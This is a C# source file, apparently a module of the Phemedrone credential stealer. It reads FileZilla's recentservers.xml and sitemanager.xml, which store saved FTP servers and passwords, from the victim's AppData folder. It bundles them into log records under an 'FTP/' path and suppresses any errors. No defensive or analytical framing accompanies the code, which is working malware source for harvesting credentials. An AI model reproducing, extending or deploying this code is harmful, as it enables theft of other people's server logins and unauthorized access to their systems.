using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using Phemedrone.Classes;
using Phemedrone.Extensions;

namespace Phemedrone.Services
{
    public class FileZilla : IService
    {
        public override PriorityLevel Priority => PriorityLevel.Medium;
        private static readonly string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
        protected override LogRecord[] Collect()
        {
            var sw = new Stopwatch();
            sw.Start();
            var array = new List<LogRecord>();
            try
            {
                AddFile(appdata + "FileZilla\\recentservers.xml");
                AddFile(appdata + "FileZilla\\sitemanager.xml");
            }
            catch
            {
                // ignored
            }
            void AddFile(string fullPath)
            {
                var content = NullableValue.Call(() => File.ReadAllBytes(fullPath));
                if (content == null) return;
                var path = appdata + "FileZilla\\";
                array.Add(new LogRecord
                {
                    Path = "FTP/" + fullPath.Replace(path, null),
                    Content = content
                });
            }
            sw.Stop();
            Debug.WriteLine("{0:00} {1:00} | {2}", sw.Elapsed.Minutes, sw.Elapsed.Seconds, nameof(FileZilla));
            return array.ToArray();
        }
        
    }
}